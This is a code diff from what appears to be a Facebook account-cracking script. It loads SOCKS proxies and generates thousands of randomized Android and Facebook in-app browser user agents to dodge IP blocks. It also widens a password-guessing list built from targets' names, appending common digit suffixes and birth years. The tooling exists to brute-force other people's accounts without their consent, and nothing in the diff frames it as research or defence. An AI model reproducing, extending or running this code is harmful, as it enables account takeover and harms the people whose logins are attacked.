@@ -29,79 +29,125 @@ proxsi=open('socksku.txt','r').read().splitlines()
 
 ###----------[ USER AGENT ]----------###
 for agenku in range(10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['10','11','12'])
-	c='CPH2421 Build/NBBTRU; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/357.0.0.49.73;]'
-	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
-	ugen.append(uakuh)
-	
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['10','11','12','13'])
+  c='V2032 Build/SP1A.210812.003; wv)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108;]'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+
 for t in range(10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6.0.1','7.1.1','8.1.0'])
-	c='SUPER-ID Build/KOT49H)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 OPT/1.7.21'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','8.1.0','9','10','11'])
-	c='MotoG3 Build/MPIS24.107-55-2-17; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='UCBrowser/12.13.4.1214 Mobile Safari/537.36'
-	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
-	ugen.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12'])
-	c='Redmi Note 9 Pro)'
-	d='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/112.0.0.0'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
-	ugen.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12'])
-	c='SM-S901B)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
-	ugen.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12'])
-	c='CPH2421 Build/NBBTRU; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/357.0.0.49.73;]'
-	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
-	usragent.append(uakuh)
-	
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12','13'])
+  c='SUPER-ID Build/QKQ1)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36 OPT/1.14.51'
+  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12','13'])
+  c='22041219C Build/SP1A.210812.016; wv)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168'
+  e=random.randrange(83,103)
+  f='0'
+  h=random.randrange(40,150)
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12','13'])
+  c='Mi 9 SE)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12','13'])
+  c='RMX3363)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12'])
+  c='CPH2339 Build/TP1A.220905.001; wv)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  usragent.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12','13'])
+  c='22021211RG Build/TKQ1.220807.001; wv)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12'])
+  c='SUPER-ID Build/RKQ1)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36 OPT/1.16.56'
+  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
+  ugen.append(uakuh)	
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12'])
+  c='CPH2307 Build/RKQ1.211103.002; wv)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108;]'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+  
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice(['8','9','10','11','12'])
+  c='EZpad M10S)'
+  d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0'
+  e=random.randrange(83,103)
+  f='0'
+  g=random.randrange(4200,4900)
+  h=random.randrange(40,150)
+  i='Safari/537.36'
+  uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
+  ugen.append(uakuh)
+#Mozilla/5.0 (Linux; Android 12; EZpad M10S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
 	###---------------[USER AGENT 2]---------------###
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -554,8 +600,12 @@ AGAR TERHINDAR DARI SPAM IP
 						pass
 					else:
 						pwv.append(frs+'123')
+						pwv.append(frs+'12')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
+						pwv.append(frs+'1992')
+						pwv.append(frs+'1993')
+						pwv.append(frs+'1994')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -564,11 +614,20 @@ AGAR TERHINDAR DARI SPAM IP
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'234')
+						pwv.append(frs+'321')
+						pwv.append(frs+'54321')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
-						pwv.append(frs+'12')
-						pwv.append(frs+'321')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
 						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
 				if 'ya' in pwt:
 					for xpwn in pwn:
 						pwv.append(xpwn)
